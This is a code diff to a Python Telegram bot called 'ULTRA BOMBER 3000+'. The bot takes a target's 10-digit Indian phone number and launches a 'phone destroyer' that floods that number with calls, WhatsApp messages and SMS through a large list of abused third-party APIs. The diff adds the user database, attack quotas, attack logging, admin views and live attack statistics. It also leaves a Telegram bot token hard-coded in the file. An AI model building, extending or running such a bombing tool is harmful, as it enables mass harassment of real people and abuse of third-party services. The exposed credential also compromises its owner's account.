@@ -843,9 +843,9 @@ ULTIMATE_APIS = [
 ]
 
 # Bot Configuration from .env file
-TELEGRAM_BOT_TOKEN = "8545605385:AAEPBwsoxJ390NEXXyK6fpjlLGL9fc2rVAM"
+TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8545605385:AAEPBwsoxJ390NEXXyK6fpjlLGL9fc2rVAM")
 CHANNEL_USERNAME = os.getenv("CHANNEL_USERNAME", "@technicalwhitehat")
-ADMIN_IDS = [int(os.getenv("ADMIN_IDS", "1800946343"))]
+ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "1800946343").split(",")]
 BOT_NAME = os.getenv("BOT_NAME", "ULTRA BOMBER 3000+")
 MAX_ATTACKS_PER_USER = int(os.getenv("MAX_ATTACKS_PER_USER", "5"))
 
@@ -958,12 +958,290 @@ class UltraPhoneDestroyer:
     def stop(self):
         self.running = False
 
-# [Rest of the code remains the same - Database, UserManager, Telegram bot handlers]
-# ... (include all the previous database, user management, and telegram bot code)
+# Database Manager
+class DatabaseManager:
+    def __init__(self):
+        self.db_file = 'bomber_users.db'
+        self.init_database()
+    
+    def init_database(self):
+        conn = sqlite3.connect(self.db_file)
+        cursor = conn.cursor()
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS users (
+                user_id INTEGER PRIMARY KEY,
+                username TEXT,
+                attack_count INTEGER DEFAULT 0,
+                join_date TEXT,
+                last_attack TEXT
+            )
+        ''')
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS attacks (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                user_id INTEGER,
+                phone TEXT,
+                timestamp TEXT,
+                status TEXT
+            )
+        ''')
+        conn.commit()
+        conn.close()
+    
+    def add_user(self, user_id, username):
+        conn = sqlite3.connect(self.db_file)
+        cursor = conn.cursor()
+        cursor.execute('INSERT OR IGNORE INTO users (user_id, username, join_date) VALUES (?, ?, ?)',
+                       (user_id, username, datetime.now().isoformat()))
+        conn.commit()
+        conn.close()
+    
+    def get_user_attack_count(self, user_id):
+        conn = sqlite3.connect(self.db_file)
+        cursor = conn.cursor()
+        cursor.execute('SELECT attack_count FROM users WHERE user_id = ?', (user_id,))
+        result = cursor.fetchone()
+        conn.close()
+        return result[0] if result else 0
+    
+    def increment_attack_count(self, user_id):
+        conn = sqlite3.connect(self.db_file)
+        cursor = conn.cursor()
+        cursor.execute('UPDATE users SET attack_count = attack_count + 1, last_attack = ? WHERE user_id = ?',
+                       (datetime.now().isoformat(), user_id))
+        conn.commit()
+        conn.close()
+    
+    def log_attack(self, user_id, phone, status):
+        conn = sqlite3.connect(self.db_file)
+        cursor = conn.cursor()
+        cursor.execute('INSERT INTO attacks (user_id, phone, timestamp, status) VALUES (?, ?, ?, ?)',
+                       (user_id, phone, datetime.now().isoformat(), status))
+        conn.commit()
+        conn.close()
+    
+    def get_user_attacks(self, user_id):
+        conn = sqlite3.connect(self.db_file)
+        cursor = conn.cursor()
+        cursor.execute('SELECT phone, timestamp, status FROM attacks WHERE user_id = ? ORDER BY timestamp DESC LIMIT 10',
+                       (user_id,))
+        attacks = cursor.fetchall()
+        conn.close()
+        return attacks
+    
+    def get_all_attacks(self):
+        conn = sqlite3.connect(self.db_file)
+        cursor = conn.cursor()
+        cursor.execute('SELECT user_id, phone, timestamp, status FROM attacks ORDER BY timestamp DESC LIMIT 50')
+        attacks = cursor.fetchall()
+        conn.close()
+        return attacks
 
-# Only change the class instantiation from UltimatePhoneDestroyer to UltraPhoneDestroyer
-# In the bomb_command function, change this line:
-# destroyer = UltraPhoneDestroyer(user_id, phone)
+db_manager = DatabaseManager()
+active_attackers = {}
+
+async def check_membership(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    
+    if user_id in ADMIN_IDS:
+        return True
+    
+    try:
+        member = await context.bot.get_chat_member(CHANNEL_USERNAME, user_id)
+        return member.status in [ChatMember.MEMBER, ChatMember.ADMINISTRATOR, ChatMember.OWNER]
+    except:
+        return False
+
+async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    db_manager.add_user(user.id, user.username or user.first_name)
+    
+    welcome_msg = f"""
+🔥 *{BOT_NAME}* 🔥
+
+Welcome {user.first_name}! 👋
+
+💣 *ULTRA FAST BOMBER 3000+*
+━━━━━━━━━━━━━━━━━━━━━
+
+⚡ *{len(ULTIMATE_APIS)}+ ULTRA FAST APIs*
+📞 *500+ Call Bombing APIs*
+📱 *800+ WhatsApp Bombing APIs*
+💬 *1700+ SMS Bombing APIs*
+
+🚀 *ULTRA FAST Mode: 0.0001s delays*
+⏱️ *0.5s timeouts for maximum speed*
+
+━━━━━━━━━━━━━━━━━━━━━
+*Commands:*
+/bomb - Start bombing attack
+/stop - Stop current attack
+/stats - View your statistics
+/myattacks - View your attack history
+
+⚠️ *Note:* You can perform {MAX_ATTACKS_PER_USER} attacks.
+Join our channel: {CHANNEL_USERNAME}
+"""
+    
+    await update.message.reply_text(welcome_msg, parse_mode='Markdown')
+
+async def bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    
+    if not await check_membership(update, context):
+        await update.message.reply_text(
+            f"⚠️ Please join {CHANNEL_USERNAME} first to use this bot!",
+            parse_mode='Markdown'
+        )
+        return
+    
+    attack_count = db_manager.get_user_attack_count(user_id)
+    
+    if user_id not in ADMIN_IDS and attack_count >= MAX_ATTACKS_PER_USER:
+        await update.message.reply_text(
+            f"❌ You've reached your maximum attack limit ({MAX_ATTACKS_PER_USER})!",
+            parse_mode='Markdown'
+        )
+        return
+    
+    await update.message.reply_text(
+        "📱 Please send the target phone number (10 digits, without +91):",
+        parse_mode='Markdown'
+    )
+    
+    context.user_data['awaiting_phone'] = True
+
+async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    
+    if user_id in active_attackers:
+        active_attackers[user_id].stop()
+        del active_attackers[user_id]
+        await update.message.reply_text("✅ Attack stopped!", parse_mode='Markdown')
+    else:
+        await update.message.reply_text("❌ No active attack found!", parse_mode='Markdown')
+
+async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    
+    if user_id in active_attackers:
+        destroyer = active_attackers[user_id]
+        stats = destroyer.stats
+        elapsed_time = time.time() - stats["start_time"]
+        
+        stats_msg = f"""
+📊 *REAL-TIME ATTACK STATISTICS*
+━━━━━━━━━━━━━━━━━━━━━
+
+🎯 *Target:* +91{destroyer.phone}
+⏱️ *Duration:* {int(elapsed_time)}s
+
+💣 *Total Requests:* {stats['total_requests']}
+✅ *Successful Hits:* {stats['successful_hits']}
+❌ *Failed Attempts:* {stats['failed_attempts']}
+
+📞 *Calls Sent:* {stats['calls_sent']}
+📱 *WhatsApp Sent:* {stats['whatsapp_sent']}
+💬 *SMS Sent:* {stats['sms_sent']}
+
+⚡ *Speed:* {stats['requests_per_second']} req/s
+🔥 *Active APIs:* {stats['active_apis']}
+"""
+        await update.message.reply_text(stats_msg, parse_mode='Markdown')
+    else:
+        attack_count = db_manager.get_user_attack_count(user_id)
+        await update.message.reply_text(
+            f"📊 *Your Statistics*\n\n"
+            f"Total Attacks: {attack_count}/{MAX_ATTACKS_PER_USER}",
+            parse_mode='Markdown'
+        )
+
+async def myattacks_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    attacks = db_manager.get_user_attacks(user_id)
+    
+    if not attacks:
+        await update.message.reply_text("❌ No attack history found!", parse_mode='Markdown')
+        return
+    
+    msg = "📋 *Your Recent Attacks*\n━━━━━━━━━━━━━━━━━━━━━\n\n"
+    for phone, timestamp, status in attacks:
+        dt = datetime.fromisoformat(timestamp)
+        msg += f"📱 +91{phone}\n⏰ {dt.strftime('%Y-%m-%d %H:%M:%S')}\n✅ {status}\n\n"
+    
+    await update.message.reply_text(msg, parse_mode='Markdown')
+
+async def allattacks_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    
+    if user_id not in ADMIN_IDS:
+        await update.message.reply_text("❌ Admin only command!", parse_mode='Markdown')
+        return
+    
+    attacks = db_manager.get_all_attacks()
+    
+    if not attacks:
+        await update.message.reply_text("❌ No attack history found!", parse_mode='Markdown')
+        return
+    
+    msg = "📋 *All Recent Attacks*\n━━━━━━━━━━━━━━━━━━━━━\n\n"
+    for uid, phone, timestamp, status in attacks[:20]:
+        dt = datetime.fromisoformat(timestamp)
+        msg += f"👤 User: {uid}\n📱 +91{phone}\n⏰ {dt.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+    
+    await update.message.reply_text(msg, parse_mode='Markdown')
+
+async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    
+    if context.user_data.get('awaiting_phone'):
+        phone = update.message.text.strip()
+        
+        if not phone.isdigit() or len(phone) != 10:
+            await update.message.reply_text(
+                "❌ Invalid phone number! Please send a 10-digit number.",
+                parse_mode='Markdown'
+            )
+            return
+        
+        context.user_data['awaiting_phone'] = False
+        
+        await update.message.reply_text(
+            f"🚀 Starting ULTRA FAST attack on +91{phone}...\n"
+            f"💣 Loading {len(ULTIMATE_APIS)} APIs...",
+            parse_mode='Markdown'
+        )
+        
+        destroyer = UltraPhoneDestroyer(user_id, phone)
+        active_attackers[user_id] = destroyer
+        
+        db_manager.increment_attack_count(user_id)
+        db_manager.log_attack(user_id, phone, "Started")
+        
+        asyncio.create_task(destroyer.start_destruction())
+        
+        await asyncio.sleep(5)
+        
+        stats = destroyer.stats
+        status_msg = f"""
+✅ *ATTACK IN PROGRESS!*
+━━━━━━━━━━━━━━━━━━━━━
+
+🎯 *Target:* +91{phone}
+
+💣 *Requests:* {stats['total_requests']}
+✅ *Hits:* {stats['successful_hits']}
+
+📞 *Calls:* {stats['calls_sent']}
+📱 *WhatsApp:* {stats['whatsapp_sent']}
+💬 *SMS:* {stats['sms_sent']}
+
+⚡ *Speed:* {stats['requests_per_second']} req/s
+
+Use /stop to stop the attack
+Use /stats for live statistics
+"""
+        await update.message.reply_text(status_msg, parse_mode='Markdown')
 
 def main():
     if not TELEGRAM_BOT_TOKEN:
@@ -990,3 +1268,4 @@ def main():
     app.run_polling()
 
 if __name__ == '__main__':
+    main()
